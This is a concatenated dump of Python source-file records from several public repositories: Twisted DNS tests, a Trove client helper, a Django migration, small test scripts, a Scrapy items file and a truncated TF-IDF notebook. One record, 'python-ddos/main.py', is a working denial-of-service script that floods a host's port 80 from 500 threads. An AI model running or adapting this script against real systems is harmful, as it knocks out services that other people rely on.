[dns.Query('example.com', dns.AXFR, dns.IN)], msg.queries)\n\n\n    def test_lookupAddress(self):\n        \"\"\"\n        L{SecondaryAuthority.lookupAddress} returns a L{Deferred} that fires\n        with the I{A} records the authority has cached from the primary.\n        \"\"\"\n        secondary = SecondaryAuthority.fromServerAddressAndDomain(\n            ('192.168.1.2', 1234), b'example.com')\n        secondary._reactor = reactor = MemoryReactorClock()\n\n        secondary.transfer()\n\n        host, port, factory, timeout, bindAddress = reactor.tcpClients.pop(0)\n\n        proto = factory.buildProtocol((host, port))\n        transport = StringTransport()\n        proto.makeConnection(transport)\n\n        query = Message(answer=1, auth=1)\n        query.decode(BytesIO(transport.value()[2:]))\n\n        # Generate a response with some data we can check.\n        soa = Record_SOA(\n            mname=b'ns1.example.com',\n            rname='admin.example.com',\n            serial=123456,\n            refresh=3600,\n            minimum=4800,\n            expire=7200,\n            retry=9600,\n            ttl=12000,\n            )\n        a = Record_A(b'192.168.1.2', ttl=0)\n        answer = Message(id=query.id, answer=1, auth=1)\n        answer.answers.extend([\n                RRHeader(b'example.com', type=SOA, payload=soa),\n                RRHeader(b'example.com', payload=a),\n                RRHeader(b'example.com', type=SOA, payload=soa),\n                ])\n\n        data = answer.toStr()\n        proto.dataReceived(pack('!H', len(data)) + data)\n\n        result = self.successResultOf(secondary.lookupAddress('example.com'))\n        self.assertEqual((\n                [RRHeader(b'example.com', payload=a, auth=True)], [], []), result)\n\n\n\nsampleBindZone = b\"\"\"\\\n$ORIGIN example.com.\n$TTL    1w\nexample.com. IN SOA dns.example.com (\n            2013120201 ; serial number of this zone file\n            1d         ; slave refresh\n            2h         ; slave retry time in case of a problem\n            4w         ; slave expiration time\n            1h         ; maximum caching time in case of failed lookups\n            )\n\n; A comment.\n@                  IN AAAA 2001:db8:10::1\nexample.com.       IN A 10.0.0.1\nno-in.example.com. A 10.0.0.2  ; technically wrong but used to work\nnot-fqdn           IN MX 10 mx.example.com\nwww                IN CNAME example.com\"\"\"\n\n\n\nclass BindAuthorityTests(unittest.TestCase):\n    \"\"\"\n    Tests for L{twisted.names.authority.BindAuthority}.\n    \"\"\"\n    def loadBindString(self, s):\n        \"\"\"\n        Create a new L{twisted.names.authority.BindAuthority} from C{s}.\n\n        @param s: A string with BIND zone data.\n        @type s: bytes\n\n        @return: a new bind authority\n        @rtype: L{twisted.names.authority.BindAuthority}\n        \"\"\"\n        fp = FilePath(self.mktemp().encode(\"ascii\"))\n        fp.setContent(s)\n\n        return authority.BindAuthority(fp.path)\n\n\n    def setUp(self):\n        self.auth = self.loadBindString(sampleBindZone)\n\n\n    def test_ttl(self):\n        \"\"\"\n        Loads the default $TTL and applies it to all records.\n        \"\"\"\n        for dom in self.auth.records.keys():\n            for rec in self.auth.records[dom]:\n                self.assertTrue(\n                    604800 == rec.ttl\n                )\n\n\n    def test_originFromFile(self):\n        \"\"\"\n        Loads the default $ORIGIN.\n        \"\"\"\n        self.assertEqual(\n            b\"example.com.\", self.auth.origin,\n        )\n        self.assertIn(\n            b\"not-fqdn.example.com\", self.auth.records,\n        )\n\n\n    def test_aRecords(self):\n        \"\"\"\n        A records are loaded.\n        \"\"\"\n        for dom, ip in [(b\"example.com\", u\"10.0.0.1\"),\n                        (b\"no-in.example.com\", u\"10.0.0.2\")]:\n            [[rr], [], []] = self.successResultOf(\n                self.auth.lookupAddress(dom)\n            )\n            self.assertEqual(\n                dns.Record_A(\n                    ip,\n                    604800,\n                ),\n                rr.payload,\n            )\n\n\n    def test_aaaaRecords(self):\n        \"\"\"\n        AAAA records are loaded.\n        \"\"\"\n        [[rr], [], []] = self.successResultOf(\n            self.auth.lookupIPV6Address(b\"example.com\")\n        )\n        self.assertEqual(\n            dns.Record_AAAA(\n                u\"2001:db8:10::1\",\n                604800,\n            ),\n            rr.payload,\n        )\n\n\n    def test_mxRecords(self):\n        \"\"\"\n        MX records are loaded.\n        \"\"\"\n        [[rr], [], []] = self.successResultOf(\n            self.auth.lookupMailExchange(b\"not-fqdn.example.com\")\n        )\n        self.assertEqual(\n            dns.Record_MX(\n                preference=10, name=\"mx.example.com\", ttl=604800,\n            ),\n            rr.payload,\n        )\n\n\n    def test_cnameRecords(self):\n        \"\"\"\n        CNAME records are loaded.\n        \"\"\"\n        [answers, [], []] = self.successResultOf(\n            self.auth.lookupIPV6Address(b\"www.example.com\")\n        )\n        rr = answers[0]\n        self.assertEqual(\n            dns.Record_CNAME(\n                name=\"example.com\", ttl=604800,\n            ),\n            rr.payload,\n        )\n\n\n    def test_invalidRecordClass(self):\n        \"\"\"\n        loadBindString raises NotImplementedError on invalid records.\n        \"\"\"\n        with self.assertRaises(NotImplementedError) as e:\n            self.loadBindString(\n                b\"example.com. IN LOL 192.168.0.1\"\n            )\n        self.assertEqual(\n            \"Record type 'LOL' not supported\", e.exception.args[0]\n        )\n\n\n    def test_invalidDirectives(self):\n        \"\"\"\n        $INCLUDE and $GENERATE raise NotImplementedError.\n        \"\"\"\n        for directive in (b\"$INCLUDE\", b\"$GENERATE\"):\n            with self.assertRaises(NotImplementedError) as e:\n                self.loadBindString(directive + b\" doesNotMatter\")\n            self.assertEqual(\n                nativeString(directive + b\" directive not implemented\"),\n                e.exception.args[0]\n            )\n\n\n\nsamplePySource = \"\"\"\\\nzone = [\n    SOA(\n        # For whom we are the authority\n        'example.com',\n\n        # This nameserver's name\n        mname = \"dns.example.com\",\n\n        # Mailbox of individual who handles this\n        rname = \"root.example.com\",\n\n        # Unique serial identifying this SOA data\n        serial = 86400,\n\n        # Time interval before zone should be refreshed\n        refresh = \"2H\",\n\n        # Interval before failed refresh should be retried\n        retry = \"1H\",\n\n        # Upper limit on time interval before expiry\n        expire = \"1H\",\n\n        # Minimum TTL\n        minimum = \"3H\"\n\n    ),\n\n    AAAA('example.com', '2001:db8:10::1'),\n    A('example.com', '10.0.0.1'),\n    NS('example.com', 'dns.example.com'),\n    A('no-in.example.com', '10.0.0.2'),\n    PTR('2.0.0.10.in-addr.arpa', 'no-in.example.com'),\n\n    CNAME('www.example.com', 'example.com'),\n    CNAME('ftp.example.com', 'example.com'),\n\n    MX('not-fqdn.example.com', 10, 'mail.example.com'),\n]\n\"\"\"\n\n\n\nclass PySourceAuthorityTests(unittest.TestCase):\n    \"\"\"\n    Tests for L{twisted.names.authority.PySourceAuthority}.\n    \"\"\"\n    def loadPySourceString(self, s):\n        \"\"\"\n        Create a new L{twisted.names.authority.PySourceAuthority} from C{s}.\n\n        @param s: A string with BIND zone data in a Python source file.\n        @type s: L{str}\n\n        @return: a new bind authority\n        @rtype: L{twisted.names.authority.PySourceAuthority}\n        \"\"\"\n        fp = FilePath(self.mktemp())\n        with open(fp.path, \"w\") as f:\n            f.write(s)\n\n        return authority.PySourceAuthority(fp.path)\n\n\n    def setUp(self):\n        self.auth = self.loadPySourceString(samplePySource)\n\n\n    def test_aRecords(self):\n        \"\"\"\n        A records are loaded.\n        \"\"\"\n        for dom, ip in [(b\"example.com\", u\"10.0.0.1\"),\n                        (b\"no-in.example.com\", u\"10.0.0.2\")]:\n            [[rr], [], []] = self.successResultOf(\n                self.auth.lookupAddress(dom)\n            )\n            self.assertEqual(\n                dns.Record_A(\n                    ip\n                ),\n                rr.payload,\n            )\n\n\n    def test_aaaaRecords(self):\n        \"\"\"\n        AAAA records are loaded.\n        \"\"\"\n        [[rr], [], []] = self.successResultOf(\n            self.auth.lookupIPV6Address(b\"example.com\")\n        )\n        self.assertEqual(\n            dns.Record_AAAA(\n                u\"2001:db8:10::1\"\n            ),\n            rr.payload,\n        )\n\n\n    def test_mxRecords(self):\n        \"\"\"\n        MX records are loaded.\n        \"\"\"\n        [[rr], [], []] = self.successResultOf(\n            self.auth.lookupMailExchange(b\"not-fqdn.example.com\")\n        )\n        self.assertEqual(\n            dns.Record_MX(\n                preference=10, name=\"mail.example.com\",\n            ),\n            rr.payload,\n        )\n\n\n    def test_cnameRecords(self):\n        \"\"\"\n        CNAME records are loaded.\n        \"\"\"\n        [answers, [], []] = self.successResultOf(\n            self.auth.lookupIPV6Address(b\"www.example.com\")\n        )\n        rr = answers[0]\n        self.assertEqual(\n            dns.Record_CNAME(\n                name=\"example.com\",\n            ),\n            rr.payload,\n        )\n\n\n    def test_PTR(self):\n        \"\"\"\n        PTR records are loaded.\n        \"\"\"\n        [answers, [], []] = self.successResultOf(\n            self.auth.lookupPointer(b\"2.0.0.10.in-addr.arpa\")\n        )\n        rr = answers[0]\n        self.assertEqual(\n            dns.Record_PTR(\n                name=b\"no-in.example.com\",\n            ),\n            rr.payload,\n        )\n\n\n    def test_badInputNoZone(self):\n        \"\"\"\n        Input file has no zone variable\n        \"\"\"\n        badPySource = \"nothing = []\"\n        self.assertRaises(ValueError, self.loadPySourceString, badPySource)\n"}
{"blob_id": "127dfa1fc8304dfc377b59c771b691b7354ab283", "directory_id": "47372f6df19e57957dd04f570bc1728b41aeeab4", "path": "/trove/common/trove_remote.py", "content_id": "f6904589a8c4d271279537cd5f5ea0733b4af567", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "2020human/trove-new", "snapshot_id": "17511c8118edf54515ddbbfcb132d49c30f680a9", "revision_id": "012da9a334bc4e9c7711dc918eea3f011463ec82", "branch_name": "refs/heads/master", "visit_date": "2020-12-30 16:16:13.081330", "revision_date": "2017-05-10 23:23:52", "committer_date": "2017-05-10 23:23:52", "github_id": "90977138", "star_events_count": "1", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1891", "extension": "py", "content": "# Copyright 2016 Tesora Inc.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nfrom oslo_utils.importutils import import_class\n\nfrom trove.common import cfg\nfrom trove.common.remote import get_endpoint\nfrom trove.common.remote import normalize_url\n\nfrom troveclient.v1 import client as TroveClient\n\nCONF = cfg.CONF\n\n\n\"\"\"\nNOTE(mwj, Apr 2016):\nThis module is separated from remote.py because remote.py is used\non the Trove guest, but the trove client is not installed on the guest,\nso the imports here would fail.\n\"\"\"\n\n\ndef trove_client(context, region_name=None):\n    if CONF.trove_url:\n        url = '%(url)s%(tenant)s' % {\n            'url': normalize_url(CONF.trove_url),\n            'tenant': context.tenant}\n    else:\n        url = get_endpoint(context.service_catalog,\n                           service_type=CONF.trove_service_type,\n                           endpoint_region=region_name or CONF.os_region_name,\n                           endpoint_type=CONF.trove_endpoint_type)\n\n    client = TroveClient.Client(context.user, context.auth_token,\n                                project_id=context.tenant,\n                                auth_url=CONF.trove_auth_url)\n    client.client.auth_token = context.auth_token\n    client.client.management_url = url\n    return client\n\n\ncreate_trove_client = import_class(CONF.remote_trove_client)\n"}
{"blob_id": "cf391ae7719a7462eefb6b30cf596bfaed596186", "directory_id": "52848ec498a908e829d6fe71d849c84265f3ad21", "path": "/movie/migrations/0003_auto_20191105_2149.py", "content_id": "724b2ae61f91e9fd8ebcca0ced32fe780124c35a", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mklsbali/Web-project-Django-Python", "snapshot_id": "0ab6d5c979cf399c7cc758216837618f261add73", "revision_id": "d9d1761d2132c7f4d36370b7406a03d2803986a1", "branch_name": "refs/heads/master", "visit_date": "2021-03-21 00:43:08.455392", "revision_date": "2020-03-14 13:29:38", "committer_date": "2020-03-14 13:29:38", "github_id": "247248590", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "507", "extension": "py", "content": "# Generated by Django 2.2.6 on 2019-11-05 19:49\n\nfrom django.db import migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('movie', '0002_auto_20191105_2140'),\n    ]\n\n    operations = [\n        migrations.RenameField(\n            model_name='post',\n            old_name='content',\n            new_name='rating',\n        ),\n        migrations.RenameField(\n            model_name='post',\n            old_name='date_posted',\n            new_name='release_date',\n        ),\n    ]\n"}
{"blob_id": "8270af50d2879b963662398d305882e4e20ea319", "directory_id": "17a995fb2f3c5da08e5e1e9326bab163c43400ac", "path": "/main.py", "content_id": "68ef1fdbd413287fc48443bb0943974b991fa5fb", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "tanupat085/python-ddos", "snapshot_id": "9b3e98d703b5d7f0529624d2e2fa136b65989c54", "revision_id": "83a844e693481248d02ed325d1b5d57b1011330a", "branch_name": "refs/heads/main", "visit_date": "2022-12-30 14:21:54.497971", "revision_date": "2020-10-20 14:55:29", "committer_date": "2020-10-20 14:55:29", "github_id": "303459007", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1131", "extension": "py", "content": "import socket\r\nimport threading\r\n\r\n\r\ntarget = '192.168.1.1'   #default gateway \u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e08\u0e32\u0e01 ipconfig \u0e01\u0e23\u0e13\u0e35\u0e19\u0e31\u0e49\u0e1c\u0e21\u0e42\u0e08\u0e21\u0e15\u0e35 router \u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07 \r\n#ip\r\n\r\n#port 22  SSH service ddos \u0e40\u0e27\u0e47\u0e1a\u0e22\u0e31\u0e07\u0e43\u0e0a\u0e49\u0e44\u0e14\u0e49\r\n#port 80  HTTP \u0e2b\u0e19\u0e49\u0e32\u0e40\u0e27\u0e47\u0e1a web interface \u0e08\u0e30\u0e25\u0e48\u0e21\r\nport = 80\r\nfake_ip = '181.21.20.32'\r\nalready_conenct = 0\r\n\r\ndef attack():\r\n    while True:\r\n        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)\r\n        #resource socket_create ( int $domain , int $type , int $protocol )\r\n        #AF_INET  \u0e04\u0e37\u0e2d IPv4 , AF_INET6 \u0e04\u0e37\u0e2d IPV6    \r\n\r\n        s.connect((target , port)) #\u0e40\u0e0a\u0e37\u0e48\u0e2d\u0e21\u0e15\u0e48\u0e2d\r\n        s.sendto((\"GET / \" + target + \"HTTP/1.1\\r\\n\").encode('ascii'),(target,port)) \r\n        s.sendto((\"HOST:\" + fake_ip + \"\\r\\n\\r\\n\").encode('ascii'),(target,port))\r\n        s.close()\r\n\r\n        global already_conenct\r\n        already_conenct += 1\r\n        if already_conenct % 500 == 0:\r\n            print(already_conenct)\r\n            \r\n\r\nfor i in range(500):\r\n    thread = threading.Thread(target=attack)\r\n    thread.start()\r\n\r\n"}
{"blob_id": "b602ac4085e444b72db2af94cef126e7f1e64f6f", "directory_id": "c7dc0859689af2039734224f32836653e2f81246", "path": "/venv/bin/easy_install", "content_id": "670981ecea9498fcb6479de06a40d03cf04c194e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "vparuthi/twitterStockPrediction", "snapshot_id": "e6c21eb8e26b8b2c92516c9169e5f9eb993449a1", "revision_id": "8190add27db01cd94962f44493b6f5b620bda5d2", "branch_name": "refs/heads/master", "visit_date": "2020-04-14 01:39:50.152441", "revision_date": "2019-01-12 23:06:39", "committer_date": "2019-01-12 23:06:39", "github_id": "163565916", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "451", "extension": "", "content": "#!/Users/Veraj/PycharmProjects/twitterSideProject/venv/bin/python\n# EASY-INSTALL-ENTRY-SCRIPT: 'setuptools==39.1.0','console_scripts','easy_install'\n__requires__ = 'setuptools==39.1.0'\nimport re\nimport sys\nfrom pkg_resources import load_entry_point\n\nif __name__ == '__main__':\n    sys.argv[0] = re.sub(r'(-script\\.pyw?|\\.exe)?$', '', sys.argv[0])\n    sys.exit(\n        load_entry_point('setuptools==39.1.0', 'console_scripts', 'easy_install')()\n    )\n"}
{"blob_id": "f7029bf8352e728a0446b35999f13bfa13ba7e57", "directory_id": "e5efea9c0060bd127aa3612fee0746298421fe54", "path": "/proof_machine/test/factoriseAndExpand_test.py", "content_id": "d0dd3ddd0e9b7697283d53387af1b7885edc1975", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kcf-jackson/Proof_machine", "snapshot_id": "2a3265d14c0342a99a94a2a8a8609403b6b235ca", "revision_id": "9ce022bdc2e57d5da3e424fbee47bf7721e8d32e", "branch_name": "refs/heads/master", "visit_date": "2021-01-01 19:32:37.579296", "revision_date": "2017-08-14 01:26:02", "committer_date": "2017-08-14 01:26:02", "github_id": "98609524", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2017-09-28 07:22:33", "gha_created_at": "2017-07-28 04:52:05", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "675", "extension": "py", "content": "import os \nos.chdir('../')\nexec(open('load.py').read())\n\nprint(\"Unit Testing for leftPushIn, leftPushOut, rightPushIn, rightPushOut\")\nexpr = parseTree( \"( c * ( a + b ) )\")\nprint(' = '.join(map(treeToString, [expr, leftPushIn(expr), leftPullOut(leftPushIn(expr))])))\n\nexpr = parseTree( \"( c / ( a - b ) )\")\nprint(' = '.join(map(treeToString, [expr, leftPushIn(expr), leftPullOut(leftPushIn(expr))])))\n\nexpr = parseTree( \"( ( a + b ) * c )\")\nprint(' = '.join(map(treeToString, [expr, rightPushIn(expr), rightPullOut(rightPushIn(expr))])))\n\nexpr = parseTree( \"( ( a - b ) / c )\")\nprint(' = '.join(map(treeToString, [expr, rightPushIn(expr), rightPullOut(rightPushIn(expr))])))\n"}
{"blob_id": "e1a3b6fdcf8c69a83babc3d504e29d1475e4fa7a", "directory_id": "61db177d6a8981b6f9aad5ef2af3725892a387b0", "path": "/practice/test.py", "content_id": "7af1c33278acc33eb143423ab80ea33776f0e3d7", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "axiomcura/simulated_data_test", "snapshot_id": "c0f0e628606dab04ca95f247833b7f0a71dc3467", "revision_id": "7b525e2db6d91032cca20628fcabd43feeabd5b5", "branch_name": "refs/heads/main", "visit_date": "2023-08-24 05:28:09.875517", "revision_date": "2021-09-20 16:55:24", "committer_date": "2021-09-20 16:55:24", "github_id": "402542753", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1719", "extension": "py", "content": "# standard lib imports\nimport sys\nimport warnings\nfrom collections import Counter\nfrom collections import defaultdict\n\n# 3rd party imports\nimport seaborn as sns\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\n# sklearn impots\nfrom sklearn.linear_model import LogisticRegressionCV\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import (\n                             average_precision_score,\n                             roc_auc_score)\nfrom scipy.stats import sem\n\n# external packages in local directory\nsys.path.append(\"../simulate-groups\")\nfrom simulate_groups import simulate_ll\n\n# removing warning message\nwarnings.filterwarnings(\"ignore\")\n\nsample_sizes = [10, 50, 100, 500, 1000, 5000, 7500, 10000]\nl1_ratios = [0.001, 0.01, 0.1, 0.3, 0.5, 0.7, 0.9, 1]\nrandom_state_vals = [0, 2, 4, 6, 8, 10] # 12, 14, 16, 18, 20]# 20 different values\n\n\nfor sample_size in sample_sizes:\n\tX, y, info_dict = simulate_ll(n=sample_size, p=20, uncorr_frac=0.1, num_groups=5)\n\tfor idx, random_state_val in enumerate(random_state_vals):\n\n\t\t# splitting and trianing data\n\t\tX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.20, random_state=random_state_val)\n\t\tmodel_cv = LogisticRegressionCV(cv=3, penalty=\"elasticnet\", solver=\"saga\", l1_ratios=l1_ratios).fit(X_train, y_train)\n\n\t\t# testing model\n\t\ty_pred = model_cv.predict(X_test)\n\t\taupr_score = round(average_precision_score(y_test, y_pred), 3)\n\t\ttry:\n\t\t\tauroc_score = round(roc_auc_score(y_test, y_pred), 3)\n\t\texcept ValueError:\n\t\t\t# aupr_score = 0\n\t\t\tauroc_score = 0\n\n\t\tprint(f\"Sample size={sample_size} Random_seed={random_state_val}, Best_l1_ratio={model_cv.l1_ratio_[0]}, AUPR={aupr_score} AUORC={auroc_score}\")"}
{"blob_id": "b8aefb27e1103358871e3241acc339d50dfb67bb", "directory_id": "035f25dba2be270c908c92f15e48e07d42db513e", "path": "/cross-modal-search/tests/test_cross_modal_search.py", "content_id": "8e68085530fa8a5f0022e98e33a3908268b95bd6", "detected_licenses": "['Apache-2.0', 'LicenseRef-scancode-free-unknown']", "license_type": "permissive", "repo_name": "nikosNalmpantis/examples", "snapshot_id": "e3fab2e72e38ddb537ee82fd0c1e60d8cb8dc9eb", "revision_id": "2d74a6c98112db88512bb102ae99b8a8a167fd2b", "branch_name": "refs/heads/master", "visit_date": "2023-07-25 06:29:23.725166", "revision_date": "2021-09-06 09:03:11", "committer_date": "2021-09-06 09:03:11", "github_id": "403640591", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2021-09-06 13:52:05", "gha_created_at": "2021-09-06 13:52:04", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "490", "extension": "py", "content": "import os\nimport sys\nsys.path.append('..')\nfrom app import main\nfrom click.testing import CliRunner\n\n\ndef config(tmpdir):\n    os.environ['JINA_WORKSPACE'] = os.path.join(tmpdir, 'workspace')\n\n\ndef test_cross_modal_search(tmpdir):\n    config(tmpdir)\n    runner = CliRunner()\n    result = runner.invoke(main, ['-t', 'index'])\n    assert 'done in' in result.stdout\n    assert result.stderr_bytes is None\n    result = runner.invoke(main, ['-t', 'query'])\n    assert result.stderr_bytes is None\n"}
{"blob_id": "d8b77194788c2761b8cce04ee01da41e417e8841", "directory_id": "b092c00e9633fb34de993351ab217df8f4e20146", "path": "/wyzw/items.py", "content_id": "ff8cf4e50f4f0142aff1d8657a7b9a3c03a965ee", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "awdela/wyzw", "snapshot_id": "b8d395beb8b1beab96f760f2418aafdab46fa35d", "revision_id": "689689c07e56cb8b48fa2f9dc6c88ee3040507db", "branch_name": "refs/heads/master", "visit_date": "2020-03-18 22:59:38.364538", "revision_date": "2018-05-30 02:25:34", "committer_date": "2018-05-30 02:25:34", "github_id": "135276692", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "473", "extension": "py", "content": "# -*- coding: utf-8 -*-\n\n# Define here the models for your scraped items\n#\n# See documentation in:\n# https://doc.scrapy.org/en/latest/topics/items.html\n\nimport scrapy\n\n\nclass WyzwItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    url = scrapy.Field()\n    title = scrapy.Field()\n    text = scrapy.Field()   \n\n#class WyzwPostItem(scrapy.Item):\n#    url = scrapy.Field()\n#    title = scrapy.Field()\n#    text = scrapy.Field()\n\n"}
{"blob_id": "0ac1449c3975aa096b58c2e55f56ccb43905a0f3", "directory_id": "1bd84f21e26971ecec9e288cfd5f56a1a136df4b", "path": "/tfidf_bagOfWords/translation.py", "content_id": "e3795d93b5933e09c1b30029b99fb092d82f1057", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "stuncyilmaz/Word2Vec_MovieReviews", "snapshot_id": "daff80789276ddb14910abf1f2adf43b7fa47522", "revision_id": "1760026d6e9b499f716d7bb9d9e0dd8a68afccbf", "branch_name": "refs/heads/master", "visit_date": "2021-01-22 18:10:46.287340", "revision_date": "2015-03-16 04:19:09", "committer_date": "2015-03-16 04:19:09", "github_id": "31440805", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11320", "extension": "py", "content": "\n# coding: utf-8\n\n# In[1]:\n\nimport gensim\nimport pandas as pd\nimport os\nimport cPickle\n\n\n# In[2]:\n\nimport numpy as np\nimport sys\nimport nltk\nimport re\nimport json\nfrom nltk.corpus import stopwords\nfrom nltk.stem import WordNetLemmatizer\nfrom nltk.tokenize import RegexpTokenizer\nfrom sklearn.feature_extraction.text import TfidfVectorizer,CountVectorizer\n\nfrom bs4 import BeautifulSoup \nfrom  sklearn.linear_model import LogisticRegression\nfrom sklearn.metrics import roc_auc_score\n\nimport matplotlib.pyplot as plt\n\n\nfrom nltk.probability import FreqDist\nfrom itertools import chain\nget_ipython().magic(u'load_ext autoreload')\nget_ipython().magic(u'autoreload 2')\n\n\n# #Paths\n\n# In[3]:\n\noriginal_data_path='../original_data/'\nsaved_data_path='../saved_data/'\nplots_path='../plots/'\n\ncodes_path='../codes/'\nif not codes_path in sys.path: sys.path.append(codes_path)\nimport chooseFeature\nimport classification_functions\n\n\n# In[4]:\n\n\ninputFName=saved_data_path+'modified_text_with_3500_clusters/train_modified_3500.json'\ninJSON = json.load(open(inputFName, \"r\"))\ntrain=pd.DataFrame(inJSON)\ninJSON =None\n\n\ninputFName=saved_data_path+'modified_text_with_3500_clusters/test_modified_3500.json'\ninJSON = json.load(open(inputFName, \"r\"))\ntest=pd.DataFrame(inJSON)\ninJSON =None\n\ntrain['review_cleaned']=train['review'].map(lambda x: \" \".join(x))\ntest['review_cleaned']=test['review'].map(lambda x: \" \".join(x))\n\n\n# In[5]:\n\ntrain_original=pd.read_csv(original_data_path+'labeledTrainData.tsv', header=0, delimiter=\"\\t\", quoting=3 )\ntrain['sentiment']=train_original['sentiment']\ntrain_original=None\ntrain_test=pd.DataFrame(pd.concat([train['review_cleaned'],test['review_cleaned']]))\n\n\n# # check bigram and unigram numbers\n\n# In[6]:\n\nall_words_train=train['review_cleaned'].map(lambda x:x.split())\nall_words_test=test['review_cleaned'].map(lambda x:x.split())\nall_words=all_words_test+all_words_train\n\nbigrams_all=[]\nfor elt in all_words:\n    bigrams_all+=list(nltk.bigrams(elt))\n    \nbigrams_all_fd = FreqDist(bigrams_all)\n\nall_words_train=list(chain.from_iterable(all_words_train))\nall_words_test=list(chain.from_iterable(all_words_test))\n\nall_words=all_words_train+all_words_test\nall_words_test,all_words_train=None,None\n\nall_words_fd = FreqDist(all_words)\n\n\n# In[7]:\n\nprint('all_words > 0:%i,bigrams_all>0: %i '%(len(set(all_words)),len(set(bigrams_all))))\n\n\n# In[8]:\n\nbigrams_cut_off_2=list(set([k for k, v in bigrams_all_fd.iteritems()  if v>2]))\nunigrams_cut_off_2=list(set([k for k, v in all_words_fd.iteritems()  if v>2]))\nprint('unigrams_cut_off_2:%i,bigrams_cut_off_2: %i '%(len(set(unigrams_cut_off_2)),len(set(bigrams_cut_off_2))))\n\n\n# In[9]:\n\nbigrams_cut_off_5=list(set([k for k, v in bigrams_all_fd.iteritems()  if v>5]))\nunigrams_cut_off_5=list(set([k for k, v in all_words_fd.iteritems()  if v>5]))\nprint('unigrams_cut_off_5:%i,bigrams_cut_off_5: %i '%(len(set(unigrams_cut_off_5)),len(set(bigrams_cut_off_5))))\n\n\n# In[10]:\n\nall_words,bigrams_all,unigrams_cut_off_2,bigrams_cut_off_2,unigrams_cut_off_5,bigrams_cut_off_5=None,None,None,None,None,None\n\n\n# # create tfidf models\n\n# In[11]:\n\ntfidfer_bigrams_cut_off_2 = TfidfVectorizer(min_df=3,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 2), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\ntfidfer_bigrams_cut_off_2.fit(list(train_test['review_cleaned']))\nX_bigrams_cut_off_2=tfidfer_bigrams_cut_off_2.transform(train_test['review_cleaned'])\ntfidfer_bigrams_cut_off_2=None\n\n\n# In[12]:\n\ntfidfer_bigrams_cut_off_5 = TfidfVectorizer(min_df=6,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 2), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\n\ntfidfer_bigrams_cut_off_5.fit(list(train_test['review_cleaned']))\nX_bigrams_cut_off_5=tfidfer_bigrams_cut_off_5.transform(train_test['review_cleaned'])\ntfidfer_bigrams_cut_off_5=None\n\n\n# In[13]:\n\ntfidfer_bigrams_cut_off_10 = TfidfVectorizer(min_df=11,  max_features=None, \n        strip_accents='unicode', analyzer='word',token_pattern=r'\\w{1,}',\n        ngram_range=(1, 2), use_idf=1,smooth_idf=1,sublinear_tf=1,\n        stop_words =None)\n\n\ntfidfer_bigrams_cut_off_10.fit(list(train_test['review_cleaned']))\nX_bigrams_cut_off_10=tfidfer_bigrams_cut_off_10.transform(train_test['review_cleaned'])\ntfidfer_bigrams_cut_off_10=None\n\n\n# In[14]:\n\ntfidfer_unigrams_cut_off_2 = TfidfVectorizer(min_df=3,  max_features=None, \n        strip_accents='unicode', 